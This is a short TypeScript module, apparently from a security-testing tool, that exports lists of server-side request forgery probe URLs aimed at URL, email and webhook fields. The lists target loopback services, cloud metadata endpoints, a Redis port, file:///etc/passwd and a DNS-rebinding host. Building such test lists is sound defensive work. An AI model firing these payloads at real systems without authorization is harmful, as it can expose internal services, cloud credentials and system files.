/** SSRF probe URLs — use against URL/email/webhook fields. */
export const SSRF_PAYLOADS = [
  'http://127.0.0.1:22',
  'http://localhost/admin',
  'http://169.254.169.254/latest/meta-data/',
  'http://[::1]/',
  'file:///etc/passwd',
  'http://0.0.0.0:8080/',
  'http://metadata.google.internal/computeMetadata/v1/',
  'http://127.0.0.1:6379/',
] as const

export const SSRF_DNS_REBIND = [
  'http://spoofed.burpcollaborator.net/',
] as const

export const SSRF_CANARY_HOST = 'security-ssrf-canary.invalid'
